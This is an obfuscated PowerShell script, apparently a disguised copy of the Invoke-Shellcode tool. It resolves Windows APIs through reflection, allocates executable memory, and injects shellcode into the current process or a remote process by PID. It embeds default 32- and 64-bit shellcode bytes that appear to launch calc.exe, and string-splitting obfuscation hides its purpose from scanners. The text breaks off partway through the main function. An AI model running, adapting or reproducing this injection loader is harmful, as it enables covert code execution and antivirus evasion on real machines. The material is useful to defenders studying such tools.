  sET Nz5E0H  ([tYpE]("{2}{3}{1}{7}{6}{4}{0}{5}"-f 'DerAC','Em.ReFLEcTIon.eMIt.','s','YsT','Il','cesS','BU','aSseMbly')  )  ; SEt ("v5"+"W")  (  [TyPE]("{7}{4}{3}{8}{0}{2}{9}{6}{5}{1}"-f 'ON.CA','s','LL','.refLEc','EM','nTIon','onVe','sySt','tI','iNGC'))  ;SEt ('T1'+'Czb') ([Type]("{1}{2}{0}" -F 'N','aPpD','OmAi'))  ;  $hyaOxt =[TYPe]("{2}{0}{1}" -F'stem.a','rraY','sY');  Sv  ('v'+'iB')  ([TYpe]("{1}{0}" -F'oL','bo') ) ;   Sv  ('dhv63'+'K')  (  [tYpE]("{0}{1}{2}"-f 'intP','T','r') )  ;   SEt-ItEM  ('varIablE:'+'HA'+'fu'+'DW') (  [TyPE]("{1}{0}" -F'Nt32','UI')  )  ; sET-VARIABle  wyTD8  ( [TyPe]("{6}{4}{2}{3}{1}{0}{5}"-F 'RsH','ERvIcEs.MA','IME','.inTeROPs','YSteM.runt','aL','s')  )  ;  function iNVokE`-`S`heLLCODE
{
[CmdletBinding( dEfaULtpARAmETErSEtNAME = {"{2}{1}{0}"-f 'l','unLoca','R'}, supPoRTsSHouldprOCess = ${Tr`Ue} , cONfiRmiMPaCT = "HI`GH")] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    ${p`R`o`CesSID},
    
    [Parameter( pAraMeteRSEtname = "RuNLo`c`Al" )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${S`hE`llc`ode},
    
    [Switch]
    ${FoR`ce} = ${F`ALSe}
)

    &("{0}{1}{2}{3}"-f 'Set-S','trict','Mod','e') -Version 2.0

    if ( ${pS`BoUnDp`A`R`A`MeTers}[("{2}{1}{0}" -f 'D','essI','Proc')] )
    {
        
        
        &("{2}{0}{1}{3}"-f'et-P','ro','G','cess') -Id ${proCE`ss`ID} -ErrorAction ("{1}{0}" -f 'p','Sto') | &("{1}{2}{0}" -f't-Null','O','u')
    }
    
    function l`o`Ca`l:gEt-DElE`gAtETY`pe
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( POSitION = 0)]
            [Type[]]
            ${PArA`M`eTeRS} = (&("{2}{0}{1}" -f 'e','ct','New-Obj') ("{0}{1}"-f'Type[',']')(0)),
            
            [Parameter( pOsItion = 1 )]
            [Type]
            ${ReT`Ur`NtyPE} = [Void]
        )

        ${DO`mAiN} =  $T1Czb::"cUrrEnt`dO`M`AiN"
        ${DYn`ASs`e`mbLy} = &("{1}{2}{3}{0}"-f 'Object','N','e','w-') ("{1}{5}{3}{0}{2}{4}" -f'mb','Sy','lyNa','Reflection.Asse','me','stem.')(("{4}{0}{3}{2}{5}{1}"-f'e','e','tedDeleg','flec','R','at'))
        ${AsSEm`BL`yBuil`dEr} = ${DOm`AIN}."DE`FIn`edy`NaM`iCAS`seMB`Ly"(${d`YNASSE`mbLy},  (dIR  vAriabLe:nz5e0h ).valuE::"R`Un")
        ${mO`d`UL`eBUILDEr} = ${A`s`SEMblybUiLd`eR}.("{0}{4}{2}{3}{1}" -f'DefineDyna','e','icM','odul','m').Invoke(("{2}{1}{0}{3}"-f'oryModul','em','InM','e'), ${F`AlSe})
        ${TyPe`BU`ild`ER} = ${mO`Du`leb`UI`lDER}.("{0}{2}{1}" -f 'D','ineType','ef').Invoke(("{4}{3}{1}{2}{0}" -f'pe','T','y','legate','MyDe'), ("{7}{5}{0}{3}{4}{6}{9}{8}{1}{2}"-f ', Se','l','ass','a','led','blic',', Ansi','Class, Pu','oC','Class, Aut'), [System.MulticastDelegate])
        ${C`OnSTr`UC`To`RBui`LDER} = ${t`YPEBU`IlD`er}.("{2}{3}{0}{1}{4}" -f'struct','o','DefineCo','n','r').Invoke(("{5}{1}{7}{6}{2}{3}{0}{4}" -f'g,','TS',', HideByS','i',' Public','R','ame','pecialN'),   (VaRiABLE  ("V5"+"W")  ).vALue::"staN`DArD", ${Pa`RAMet`ErS})
        ${C`OnS`TR`UC`ToRBuI`LDER}.("{4}{0}{2}{1}{3}{5}" -f 'em','ationFl','ent','a','SetImpl','gs').Invoke(("{1}{0}{2}"-f 'untime, Manag','R','ed'))
        ${m`EtHO`D`B`UILDeR} = ${T`YPEBuILD`eR}.("{3}{2}{1}{0}"-f'od','th','neMe','Defi').Invoke('Invoke', ("{9}{2}{6}{8}{10}{0}{4}{7}{3}{5}{1}"-f 'N','al','ublic, H',' V','ewS','irtu','ideB','lot,','yS','P','ig, '), ${r`eTuR`Nty`pE}, ${Pa`RAm`E`TerS})
        ${M`eT`hodBUIL`DeR}.("{4}{2}{3}{0}{1}" -f'F','lags','mentat','ion','SetImple').Invoke(("{2}{3}{1}{0}{4}"-f ' Ma','ime,','R','unt','naged'))
        
        &("{2}{0}{1}"-f'rite-Ou','tput','W') ${Ty`p`Ebuild`eR}.("{2}{0}{1}" -f 'p','e','CreateTy').Invoke()
    }

    function lOCA`L:`get-procAddRE`SS
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( POSITIOn = 0, MANDATORY = ${t`RUE} )]
            [String]
            ${M`odULE},
            
            [Parameter( poSitION = 1, MandAtory = ${t`RuE} )]
            [String]
            ${pR`oc`EDuRE}
        )

        
        ${SYS`T`emASS`embLY} =  (cHiLDITEM ('vaRi'+'AB'+'le:t1'+'CZB')  ).vALUE::"Cu`RrenT`D`o`MaIN".("{1}{0}{3}{2}{4}" -f 's','GetAs','e','embli','s').Invoke() |
            &("{0}{2}{3}{1}" -f 'Wher','bject','e','-O') { ${_}."gloBalassEMBl`Y`cA`cHe" -And ${_}."loCA`TI`On".("{1}{0}"-f'it','Spl').Invoke('\\')[-1].("{0}{1}{2}" -f 'Eq','ua','ls').Invoke(("{1}{0}{2}" -f'ste','Sy','m.dll')) }
        ${u`NsAfE`N`ATIv`E`Me`ThOdS} = ${sYste`Ma`s`Se`MBly}.("{0}{2}{1}"-f 'GetT','e','yp').Invoke(("{3}{7}{4}{2}{6}{1}{0}{5}"-f'eth','ativeM','Wi','Mi','.','ods','n32.UnsafeN','crosoft'))
        
        ${GETMoDU`LEh`AnD`le} = ${unsAFEn`A`TIvEMeTh`OdS}.("{2}{1}{0}"-f'od','Meth','Get').Invoke(("{2}{1}{0}" -f'e','l','GetModuleHand'))
        ${G`Et`pRO`cADdREsS} = ${UNSAF`e`NaTivem`E`TH`ODs}.("{1}{0}"-f 'Method','Get').Invoke(("{3}{0}{2}{1}{4}"-f 't','Add','Proc','Ge','ress'))
        
        ${KERn`32haNd`LE} = ${Ge`T`mOdUl`eHAn`DlE}."In`VO`kE"(${N`UlL}, @(${m`od`UlE}))
        ${tmP`P`TR} = &("{0}{3}{1}{2}" -f'New-','b','ject','O') ("{2}{1}{0}"-f'r','tPt','In')
        ${H`AnDler`Ef} = &("{0}{2}{1}"-f 'New-O','ect','bj') ("{1}{6}{8}{3}{7}{2}{4}{0}{5}"-f'ices.H','S','ime.Inte','m.Ru','ropServ','andleRef','y','nt','ste')(${tM`p`pTr}, ${k`Er`N32H`ANDLE})
        
        
        &("{2}{1}{0}"-f'Output','ite-','Wr') ${g`eT`pRo`caDdREsS}."IN`V`OkE"(${nu`Ll}, @([System.Runtime.InteropServices.HandleRef]${H`ANDl`er`ef}, ${pR`OCe`DU`RE}))
    }

    
    function LO`Ca`l`:`emiT-calLThReadsTUB ([IntPtr] ${b`As`EADDR}, [IntPtr] ${ExI`TTh`REAd`AD`DR}, [Int] ${archI`T`eCT`U`Re})
    {
        ${I`NtSiZ`EpTR} = ${aR`cHiTeCT`UrE} / 8

        function L`Oc`Al:cOn`VeRT`T`O-litT`L`eEnd`iAn ([IntPtr] ${aD`dress})
        {
            ${LittL`EEN`DI`ANB`YTea`RRAy} = &("{1}{2}{3}{0}"-f't','N','ew-O','bjec') ("{1}{0}" -f 'yte[]','B')(0)
            ${aDd`RE`Ss}.("{0}{1}"-f 'To','String').Invoke("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | &("{4}{2}{0}{3}{1}" -f'Obj','ct','rEach-','e','Fo') { if (${_}) { ${L`ITtlEENDiA`Nby`TE`ARRaY} += [Byte] ('0x{0}' -f ${_}) } }
              ( LS  varIABLe:hYAoXT  ).vaLue::("{2}{1}{0}"-f 'se','ver','Re').Invoke(${l`ItT`lE`Endi`ANB`yTE`ArrAY})
            
            &("{0}{2}{1}"-f 'Wr','ut','ite-Outp') ${litT`l`eeNdIanbYT`ea`RRAy}
        }
        
        ${calL`s`TUB} = &("{2}{0}{1}"-f'c','t','New-Obje') ("{1}{0}" -f'yte[]','B')(0)
        
        if (${INt`s`Ize`PTr} -eq 8)
        {
            [Byte[]] ${CaL`L`stUb} = 0x48,0xB8                      
            ${Cal`lS`Tub} += &("{0}{1}{4}{5}{2}{3}"-f'C','o','tl','eEndian','nv','ertTo-Lit') ${B`A`SeAddr}       
            ${cALl`St`UB} += 0xFF,0xD0                              
            ${cAL`LsT`Ub} += 0x6A,0x00                              
            ${C`All`sTuB} += 0x48,0xB8                              
            ${C`A`l`lStUB} += &("{6}{5}{4}{1}{3}{0}{2}" -f 'ia','t','n','leEnd','it','tTo-L','Conver') ${E`xitthREA`da`dDR} 
            ${CALlS`T`Ub} += 0xFF,0xD0                              
        }
        else
        {
            [Byte[]] ${c`AlLs`TuB} = 0xB8                           
            ${CaLL`STuB} += &("{2}{3}{0}{6}{4}{1}{5}" -f'o-LittleEn','a','Conver','tT','i','n','d') ${baSE`ADdR}       
            ${c`ALls`T`UB} += 0xFF,0xD0                              
            ${C`ALLs`TUb} += 0x6A,0x00                              
            ${C`ALls`TUb} += 0xB8                                   
            ${caLL`s`Tub} += &("{0}{4}{2}{1}{3}" -f 'ConvertTo-Litt','ndi','E','an','le') ${eXIT`TH`REAdAd`dR} 
            ${caLL`S`TuB} += 0xFF,0xD0                              
        }
        
        &("{1}{3}{0}{2}"-f 'tp','Writ','ut','e-Ou') ${c`All`StUB}
    }

    function lO`caL`:InjeCt-`RemO`Tes`HE`LLC`Ode ([Int] ${P`R`oCeSSiD})
    {
        
        ${HPR`OCeSs} = ${o`peN`p`RoceSS}."i`N`VoKE"(0x001F0FFF, ${faL`SE}, ${pROC`E`SSiD}) 
        
        if (!${hp`Ro`Cess})
        {
            Throw ('Unabl'+'e'+' '+'to'+' '+'open'+' '+'a '+'pr'+'oce'+'ss '+'ha'+'ndle '+'for'+' '+'PID:'+' '+"$ProcessID")
        }

        ${I`Swow`64} = ${f`AlSE}

        if (${6`4BIt`OS}) 
        {
            
            ${iSwoW`64P`RoCE`SS}."IN`VoKe"(${h`pr`ocEsS}, [Ref] ${I`SWoW64}) | &("{1}{0}"-f 'ut-Null','O')
            
            if ((!${ISWo`w64}) -and ${p`OWeRsHe`L`l32BIt})
            {
                Throw ("{0}{18}{1}{26}{9}{25}{23}{11}{7}{19}{15}{6}{16}{20}{12}{14}{30}{22}{13}{21}{3}{10}{4}{17}{24}{28}{29}{27}{5}{2}{8}" -f'Shel','de in','ell if you want th','ot supported. ',' t','h','bit proce',' 6','is to work.','ection','Use','ting a','2-b','owerShell is','it','-','ss f','he 64-bi','lco','4','rom 3',' n','P','arge','t ',' t','j','wers','version o','f Po',' ')
            }
            elseif (${iSw`OW`64}) 
            {
                if (${Sh`E`LlCOde32}."lENg`TH" -eq 0)
                {
                    Throw ('No'+' '+'she'+'ll'+'code '+'w'+'as '+'plac'+'ed '+'in'+' '+'th'+'e '+(('1WpShel'+'lcode'+'32'+' ')  -REplACe  ([chAR]49+[chAR]87+[chAR]112),[chAR]36)+'va'+'riabl'+'e!')
                }
                
                ${shE`llC`ODE} = ${SHe`l`lCod`e32}
                &("{3}{2}{1}{0}"-f'e','s','ite-Verbo','Wr') ("{0}{3}{5}{6}{1}{2}{4}"-f 'I','ow6','4','njecting',' process.',' in','to a W')
                &("{0}{1}{3}{2}"-f'Wr','ite-V','se','erbo') ("{4}{6}{7}{0}{5}{1}{3}{2}" -f's','l','e.','cod','Using 32-bi','hel','t',' ')
            }
            else 
            {
                if (${SHEllCO`D`e`64}."lE`Ngth" -eq 0)
                {
                    Throw ('No'+' '+'she'+'ll'+'cod'+'e '+'w'+'as '+'placed'+' '+'i'+'n '+'the'+' '+('SNO'+'Shellcode'+'64'+' ').("{1}{0}" -f'EpLaCE','r').Invoke('SNO','$')+'varia'+'bl'+'e!')
                }
                
                ${she`Llc`ODE} = ${SH`ELLCodE`64}
                &("{0}{1}{2}" -f 'Wri','te-V','erbose') ("{4}{1}{3}{0}{2}" -f 'llcode','ing 64-bit ','.','she','Us')
            }
        }
        else 
        {
            if (${shE`llcod`e`32}."le`Ngth" -eq 0)
            {
                Throw ('No'+' '+'sh'+'ell'+'cod'+'e '+'wa'+'s '+'plac'+'ed '+'in'+' '+'the'+' '+('glTS'+'hel'+'lco'+'de32 ')."rEP`LACe"('glT',[STRing][Char]36)+'va'+'riable'+'!')
            }
            
            ${SHel`l`CoDE} = ${sheLlC`O`D`E32}
            &("{1}{0}{2}" -f'Verbo','Write-','se') ("{3}{4}{1}{0}{2}"-f'shel','it ','lcode.','Usi','ng 32-b')
        }

        
        ${r`eMOTEmem`ADDr} = ${V`iRTUal`ALloc`EX}."I`NV`Oke"(${H`p`ROCEsS},  (  Get-VaRiABlE  ("D"+"Hv6"+"3k")).valuE::"ze`RO", ${S`heLL`cO`De}."Leng`TH" + 1, 0x3000, 0x40) 
        
        if (!${r`eMoT`eMeM`A`dDR})
        {
            Throw ('Unab'+'l'+'e '+'to'+' '+'allo'+'cat'+'e '+'shellco'+'d'+'e '+'memo'+'ry'+' '+'in'+' '+'PID:'+' '+"$ProcessID")
        }
        
        &("{2}{0}{1}" -f'e-V','erbose','Writ') "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)")) "

        
        ${wR`i`T`epR`oCESsmEm`ORy}."iN`VoKe"(${HPR`Oce`sS}, ${R`em`OtememAdDR}, ${s`HeL`LcOdE}, ${she`l`lc`OdE}."l`e`NgTH", [Ref] 0) | &("{1}{0}" -f 'Null','Out-')

        
        ${EXIT`ThRe`AD`AD`Dr} = &("{0}{2}{1}"-f'Get-ProcAddre','s','s') ("{0}{1}{2}{3}"-f 'kern','el32.d','l','l') ("{2}{0}{1}"-f 'hr','ead','ExitT')

        if (${iSwo`w64})
        {
            
            ${C`ALLst`UB} = &("{0}{1}{3}{4}{2}" -f 'Emi','t-Call','tub','T','hreadS') ${Re`moTeMe`mAD`dR} ${EXittH`Re`AdaD`dR} 32
            
            &("{3}{0}{2}{1}{4}" -f'-','rb','Ve','Write','ose') ("{5}{0}{6}{3}{7}{1}{2}{4}"-f'i','all ','stu','-bit assembly ','b.','Em','tting 32','c')
        }
        else
        {
            
            ${CA`lL`STUb} = &("{0}{2}{4}{1}{5}{3}"-f'E','re','mit-Cal','Stub','lTh','ad') ${rEMo`T`eMemaddr} ${ExitTHRE`AdaD`DR} 64
            
            &("{0}{1}{2}{3}{4}"-f'Write-','V','er','b','ose') ("{2}{1}{8}{6}{3}{7}{0}{4}{5}" -f'c','t','Emi',' ','all stu','b.','ng','64-bit assembly ','ti')
        }

        
        ${r`EMOteST`U`BA`DDr} = ${v`I`RtuA`LaLL`oCEX}."INV`o`kE"(${Hpr`oCESs},   (Get-vArIaBLe DHV63k  -VALUeoN  )::"zE`Ro", ${caL`lstUB}."le`NGTH", 0x3000, 0x40) 
        
        if (!${RE`moTESt`UB`AdDR})
        {
            Throw ('Unabl'+'e '+'to'+' '+'a'+'l'+'locate '+'t'+'hr'+'ead '+'cal'+'l '+'st'+'ub '+'m'+'emory'+' '+'in'+' '+'PI'+'D: '+"$ProcessID")
        }
        
        &("{1}{2}{0}{4}{3}" -f 't','Wr','i','Verbose','e-') "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)")) "

        
        ${w`RItEP`RoCe`SSm`e`MoRy}."INvO`KE"(${h`P`R`oCEsS}, ${rEM`o`TESTuba`D`dr}, ${C`A`llstUb}, ${CALL`St`Ub}."LeN`gTH", [Ref] 0) | &("{0}{1}"-f'Out','-Null')

        
        ${t`hREaDh`An`dLe} = ${CRE`At`eReMot`ethre`AD}."I`NVokE"(${HPrOc`E`Ss},  $DHV63k::"zE`RO", 0, ${rEmOT`es`T`Ub`ADdR}, ${r`e`MOt`em`eMaDDr}, 0,   ( variABLe DhV63k).vaLUe::"Z`ero")
        
        if (!${Th`READha`N`d`le})
        {
            Throw ('Una'+'ble '+'to'+' '+'laun'+'ch'+' '+'r'+'emot'+'e '+'thr'+'ead '+'in'+' '+'PID:'+' '+"$ProcessID")
        }

        
        ${cL`OSe`haND`LE}."i`NVoKe"(${hP`R`Oce`Ss}) | &("{1}{2}{0}"-f'ull','Out','-N')

        &("{1}{0}{2}"-f'Ver','Write-','bose') ("{5}{7}{3}{0}{8}{2}{1}{6}{4}" -f'e inje','mple',' co','cod','!','Sh','te','ell','ction')
    }

    function lO`caL`:`iNjEcT-L`OCals`hEL`l`CoDE
    {
        if (${P`OweRsH`el`L32`BIt}) {
            if (${SH`ellcod`e32}."l`E`Ngth" -eq 0)
            {
                Throw ('No'+' '+'s'+'h'+'ellcode '+'wa'+'s '+'pla'+'c'+'ed '+'in'+' '+'th'+'e '+('{0}'+'Shellc'+'ode3'+'2 ')-f[cHAR]36+'var'+'i'+'able!')
                return
            }
            
            ${s`heLlcO`De} = ${sH`eL`LCoDe32}
            &("{2}{3}{1}{0}" -f 'ose','rb','Wri','te-Ve') ("{1}{5}{2}{6}{0}{4}{3}" -f' s','U','ing','ode.','hellc','s',' 32-bit')
        }
        else
        {
            if (${SHEL`lcOD`e`64}."L`En`gth" -eq 0)
            {
                Throw ('No'+' '+'s'+'hell'+'cod'+'e '+'w'+'as '+'pl'+'ace'+'d '+'in'+' '+'t'+'he '+('{0}Shell'+'co'+'d'+'e'+'64 ')  -F [CHaR]36+'v'+'a'+'riable!')
                return
            }
            
            ${sHEll`cO`de} = ${ShEL`Lco`D`e64}
            &("{2}{1}{0}"-f '-Verbose','e','Writ') ("{6}{0}{1}{4}{5}{2}{3}" -f'4-bit',' she','code','.','l','l','Using 6')
        }
    
        
        ${bas`EA`dDReSs} = ${VIrTUAL`ALl`oC}."iNV`O`KE"(  (  item  vaRIAble:Dhv63K  ).vaLUe::"z`ero", ${shE`l`lcOde}."LE`Ng`TH" + 1, 0x3000, 0x40) 
        if (!${bAsEaDd`R`e`Ss})
        {
            Throw ('Una'+'ble '+'to'+' '+'al'+'l'+'oc'+'ate '+'s'+'h'+'ellcode '+'memo'+'ry'+' '+'i'+'n '+'PID'+': '+"$ProcessID")
        }
        
        &("{1}{2}{0}"-f 'ose','Wr','ite-Verb') "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)")) "

        
         ( varIAble  ("wytd"+"8")  -vALueONLy  )::("{1}{0}" -f 'opy','C').Invoke(${Sh`EL`LcoDE}, 0, ${BasEa`DD`REsS}, ${She`lL`C`Ode}."Len`GtH")
        
        
        ${ExIT`ThRE`Ad`AdDr} = &("{1}{0}{2}{3}"-f'oc','Get-Pr','Addre','ss') ("{1}{2}{0}"-f'll','ke','rnel32.d') ("{2}{0}{1}"-f 'xitTh','read','E')
        
        if (${pow`eR`She`lL32`Bit})
        {
            ${c`AlLS`TUB} = &("{0}{1}{4}{3}{2}"-f'Emi','t-Call','b','readStu','Th') ${basEa`dDR`eSs} ${E`xItt`hREaDA`Ddr} 32
            
            &("{1}{3}{0}{2}"-f 'r','Write-V','bose','e') ("{5}{6}{0}{1}{3}{2}{7}{4}"-f'g ','32',' ass','-bit','call stub.','Em','ittin','embly ')
        }
        else
        {
            ${CALL`S`TuB} = &("{1}{0}{3}{2}{5}{4}"-f'm','E','Th','it-Call','adStub','re') ${baSeAdDr`E`SS} ${eXittHReA`dA`ddR} 64
            
            &("{1}{2}{0}"-f 'e','Write-Ver','bos') ("{1}{6}{4}{3}{2}{5}{0}"-f'b.','Emitt','asse','-bit ','64','mbly call stu','ing ')
        }

        
        ${CALls`Tu`B`AddrESs} = ${VI`Rt`U`AlAl`LoC}."i`NvOKE"(  (VarIabLe DhV63k ).vaLUe::"z`ERo", ${c`AlLS`Tub}."Le`NGTh" + 1, 0x3000, 0x40) 
        if (!${cA`L`lstuBAd`DR`EsS})
        {
            Throw ("{8}{4}{0}{2}{7}{1}{3}{5}{6}" -f'lo','ead c','cate','all','l',' st','ub.',' thr','Unable to a')
        }
        
        &("{1}{0}{2}" -f'ite-V','Wr','erbose') "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)")) "

        
          (  cHiLdItEM  VaRIabLe:wyTd8).valuE::("{0}{1}" -f'Cop','y').Invoke(${c`Al`LsTUB}, 0, ${cAl`ls`Tub`AdD`Ress}, ${Ca`Ll`sTUB}."LENG`TH")

        
        ${threaD`hAn`Dle} = ${CreATe`T`hreaD}."i`NvOKE"( $Dhv63k::"Ze`Ro", 0, ${CA`LLSTUbAdDR`ess}, ${bAsEaD`D`ResS}, 0,   (  GEt-vaRIAbLE ('dHv'+'63K')).vAlUE::"Z`ERo")
        if (!${TH`ReAdh`A`NDlE})
        {
            Throw ("{1}{3}{0}{6}{5}{7}{4}{2}"-f'lau','Unab','.','le to ','d','hr','nch t','ea')
        }

        
        ${w`AITF`o`RSinglEo`BJecT}."INv`o`kE"(${THRe`ADHan`d`Le}, 0xFFFFFFFF) | &("{1}{2}{0}" -f'l','Out-Nu','l')
        
        ${v`iRtuAl`FrEe}."I`Nvo`kE"(${caLLstu`BaD`dR`e`ss}, ${cALLs`T`UB}."LEng`TH" + 1, 0x8000) | &("{1}{0}"-f'll','Out-Nu') 
        ${v`IrTu`ALFr`Ee}."i`NVO`KE"(${bAseA`dD`Re`SS}, ${sH`eLLco`De}."lE`NG`Th" + 1, 0x8000) | &("{2}{0}{1}" -f 'u','ll','Out-N') 

        &("{1}{0}{3}{2}"-f'ite-Ve','Wr','e','rbos') ("{4}{0}{2}{3}{1}{5}"-f 'ec','plet','tion ','com','Shellcode inj','e!')
    }

    
    ${I`sWow6`4pR`oC`ESsA`ddr} = &("{2}{1}{0}{3}{4}" -f 'cAddr','o','Get-Pr','es','s') ("{3}{2}{0}{1}"-f '2.d','ll','3','kernel') ("{0}{2}{3}{1}" -f'IsWow','ss','64Proc','e')

    ${ADd`REs`S`WidtH} = ${NU`ll}

    try {
        ${A`dDr`E`SSwidTH} = @(&("{0}{1}{2}"-f 'Get-Wm','iOb','ject') -Query ("{9}{0}{1}{7}{8}{3}{2}{10}{5}{6}{4}" -f 'T ','AddressW','h ','t','r','ro','cesso','i','d','SELEC','FROM Win32_P'))[0] | &("{1}{2}{3}{0}" -f 't','Select','-Obje','c') -ExpandProperty ("{1}{0}{2}{3}"-f 'd','A','dressWid','th')
    } catch {
        throw ("{6}{5}{9}{0}{2}{8}{4}{3}{1}{7}"-f'sso','s width','r','res','dd','ble to de','Una','.',' a','termine OS proce')
    }

    switch (${addrESsw`I`dTh}) {
        '32' {
            ${6`4BItOS} = ${Fa`LsE}
        }

        '64' {
            ${64`BIt`os} = ${TR`UE}

            ${IsW`O`W64prO`c`e`Ssd`EleGATE} = &("{0}{3}{2}{1}{4}"-f'Get-De','p','y','legateT','e') @([IntPtr],   ( lS  ('VArIA'+'BLe:VI'+'B') ).vaLue.("{2}{1}{0}{3}"-f 'ByR','ke','Ma','efType').Invoke()) ([Bool])
    	    ${i`s`wo`w6`4PRoCEss} =  ( geT-VARiaBle  ('w'+'ytd8')  -VA)::("{0}{5}{3}{7}{8}{6}{4}{1}{2}" -f 'GetD','tionPointe','r','eg','nc','el','u','ateFor','F').Invoke(${iSWOw6`4`pR`ocEs`s`Addr}, ${ISW`oW64p`ROceSs`dELe`GATE})
        }

        ("{0}{1}{2}" -f 'de','faul','t') {
            throw ("{2}{4}{6}{1}{3}{5}{0}" -f'tected.','t','Invalid OS ad','h d','dress','e',' wid')
        }
    }

    if (  $dhv63k::"Si`Ze" -eq 4)
    {
        ${PO`w`e`RsH`eLL32biT} = ${t`Rue}
    }
    else
    {
        ${P`o`we`RsHeLl32b`IT} = ${FaL`SE}
    }

    if (${PsbOu`NdpA`RaM`eteRs}[("{1}{2}{0}{3}" -f 'lco','S','hel','de')])
    {
        
        
        [Byte[]] ${S`HeLLC`ODE`32} = ${SHe`Ll`CoDe}
        [Byte[]] ${SHe`L`LCODE64} = ${she`LL`cOde32}
    }
    else
    {
        
        
        
        
        
        [Byte[]] ${s`HE`L`lcodE32} = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                  0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                  0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
                                  0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,
                                  0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,
                                  0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                                  0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
                                  0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,
                                  0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,
                                  0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                  0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                  0x61,0x6c,0x63,0x00)

        
        
        [Byte[]] ${S`H`elLc`oDE64} = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                  0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                  0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                                  0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                                  0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                                  0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                                  0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                                  0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                                  0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                                  0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                                  0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                                  0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                                  0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                                  0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                                  0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
    }

    if ( ${p`SboU`Ndp`AR`AMETers}[("{0}{2}{1}" -f 'Proc','ssID','e')] )
    {
        
        ${O`Penp`Roces`saDdR} = &("{0}{1}{2}{3}{4}" -f'G','et','-','ProcAddres','s') ("{0}{2}{3}{1}"-f 'kernel','dll','3','2.') ("{2}{3}{0}{1}" -f 's','s','Op','enProce')
        ${Ope`N`P`RO`CE`ssDeLEgatE} = &("{3}{4}{1}{0}{2}" -f'e','-D','legateType','G','et') @([UInt32], [Bool], [UInt32]) ([IntPtr])
        ${opE`NProCE`ss} =  $WYtd8::("{3}{0}{5}{2}{4}{1}" -f'tDele','inter','F','Ge','unctionPo','gateFor').Invoke(${op`EnprOCeSS`A`d`Dr}, ${opEn`PRO`C`es`sdelegatE})
